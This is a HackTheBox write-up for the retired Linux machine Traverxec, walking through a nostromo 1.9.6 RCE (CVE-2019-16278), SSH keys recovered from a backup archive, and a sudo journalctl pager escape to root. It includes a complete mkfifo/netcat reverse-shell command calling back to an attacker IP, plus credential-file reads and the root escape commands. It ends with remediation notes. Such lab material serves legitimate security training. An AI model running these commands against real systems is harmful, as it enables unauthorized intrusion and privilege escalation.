HTB Traverxec: nostromo RCE, a backup key, and journalctl to root

retired-machineeasy

Traverxec is a retired HackTheBox easy Linux machine serving websites with nostromo 1.9.6 (nhttpd). Synopsis: a homedir-escape RCE (CVE-2019-16278), SSH keys hiding in a backup archive, and a sudo journalctl pager escape for root.

$ Enumeration — rare server, famous bug

# nmap: read the Server banner
nmap -sC -sV -oN traverxec.nmap 10.10.10.165

The Server header says nostromo 1.9.6, which is CVE-2019-16278: a homedir-path RCE via crafted requests. Rare software, public exploit, short path — when version and exploit agree this cleanly, run it.

$ Foothold — nostromo RCE

# bash: homedir escape to shell
# public nostromo 1.9.6 exploit abuses homedir path handling:
python3 nostromo-rce.py 10.10.10.165 80 "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.23 4444 >/tmp/f"
nc -lvnp 4444   # shell as dawid

Catch the callback as the dawid service user, then enumerate files before passwords.

$ Lateral move — backup keys plus config creds

# bash: unlock the protected dir, reuse the key
cat /var/nostromo/conf/.htpasswd   # credential for the protected web dir
ls ~/backup-ssh-identity-files.tgz
tar xzf backup-ssh-identity-files.tgz
ssh -i david_key david@10.10.10.165

The home hides a backup archive of SSH identity files, and the server config holds the protected-directory credential. Combine the two — credentials plus recovered key material — to SSH in as the fuller david user. Backup files are credential storage until proven otherwise.

$ Privilege escalation — sudo journalctl escape

# bash: pager escape to root
sudo -l   # (root) NOPASSWD: /usr/bin/journalctl
sudo /usr/bin/journalctl
!/bin/sh   # typed inside the less pager
id   # uid=0(root)

journalctl pages through less, and less escapes to shell with !command. Sudo on any pager, editor, or interpreter is root — the GTFOBins entry for this pattern is worth memorizing. Flag values redacted per HTB rules; earn them in your own lab.

$ Dead ends

Brute-forcing the protected web directory (its credential is on disk in the server config) and overlooking the backup archive.

$ Remediation notes

Patch or replace rare web servers, keep SSH keys out of backups, and audit sudo against GTFOBins. Written by Lucky Thandel.
